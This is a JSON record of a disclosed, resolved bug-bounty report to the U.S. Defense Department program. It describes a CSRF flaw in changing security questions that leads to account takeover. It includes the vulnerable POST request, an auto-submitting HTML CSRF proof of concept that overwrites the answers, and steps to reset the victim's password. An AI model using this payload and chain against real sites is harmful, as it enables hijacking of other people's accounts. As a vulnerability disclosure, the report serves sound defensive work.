{
  "id": 2652603,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjUyNjAz",
  "url": "https://hackerone.com/reports/2652603",
  "title": "CSRF Attack on changing security questions leads to full Account TakeOver",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2024-08-12T16:16:05.474Z",
  "submitted_at": "2024-08-12T16:16:05.666Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "prakhar0x01",
    "url": "/prakhar0x01",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/gecq6ow8x223iya2yv912rmhwfct/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2024-12-18T19:47:17.631Z",
  "bug_reporter_agreed_on_going_public_at": "2024-08-30T14:32:42.565Z",
  "team_member_agreed_on_going_public_at": "2024-12-18T19:47:17.485Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Description:**\nHii, \n\n\nWhile researching https://www.████/, I discovered that an attacker could exploit a CSRF vulnerability to perform a password reset and gain full control of any user's account.\n\nThere is a feature in the user profile that allows users to change their security questions and answers. However, when the user changes this information, the application does not verify the CSRF token, resulting in a CSRF vulnerability in that functionality.\n\nAdditionally, there is another functionality on the reset password. Users can change their password via the security questions. However, exploiting the previously mentioned vulnerability will lead to bypassing this feature and result in a 1-Click Account Takeover.\n\n\n### Vulnerable Request\n\n```\nPOST /member/updatesecurityquestions HTTP/2\nHost: www.███████\nCookie: {YOUR-COOKIE}\nContent-Length: 170\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: https://www.██████████\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: https://www.██████/member/updatesecurityquestions\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n\nsecurity_questions1=1&security_question_answer1=temp&security_questions2=2&security_question_answer2=temp&security_questions3=3&security_question_answer3=temp&submit=Save\n```\n\n## References\n\n**Video PoC**\n\n███████\n\n## Impact\n\n1-  CSRF Vulnerability on Changing Security Questions/Answers\n2 - Account Takeover\n\n## System Host(s)\nwww.█████\n\n## Affected Product(s) and Version(s)\n\n\n## CVE Numbers\n\n\n## Steps to Reproduce\n1 - Create an Account on : `https://www.███/`\n2 - Navigate to : `https://www.█████████/member/updatesecurityquestions` and update Security questions\n3 - Intercept the request, Create CSRF PoC or you can use this\n\n```\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n    <form action=\"https://www.█████████/member/updatesecurityquestions\" method=\"POST\">\n      <input type=\"hidden\" name=\"security&#95;questions1\" value=\"1\" />\n      <input type=\"hidden\" name=\"security&#95;question&#95;answer1\" value=\"hacked\" />\n      <input type=\"hidden\" name=\"security&#95;questions2\" value=\"2\" />\n      <input type=\"hidden\" name=\"security&#95;question&#95;answer2\" value=\"hacked\" />\n      <input type=\"hidden\" name=\"security&#95;questions3\" value=\"3\" />\n      <input type=\"hidden\" name=\"security&#95;question&#95;answer3\" value=\"hacked\" />\n      <input type=\"hidden\" name=\"submit\" value=\"Save\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n```\n4 - Execute it in the browser, See that security questions have been changed.\n5 - Now, navigate to another private window, go to `https://www.██████/forgotpassword/?redirect_to=%2Fmember%2Foptions%2Fcurrenttab%2Femail`, Observe an option **On Screen Reset**\n6 - Since as an attacker, you know the victim's security questions & answers, hence put the right answers & you can change the victim's password.\n\n## Suggested Mitigation/Remediation Actions\n\n\n",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 40,
  "voters": [
    "loaymorad",
    "orange303",
    "2026",
    "thalaivar304",
    "mohaned0101",
    "blackhacker8796",
    "jackhavoltrey",
    "0xhacker1xox",
    "ronisec",
    "ahmed_magdy",
    "and 30 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 8.8,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
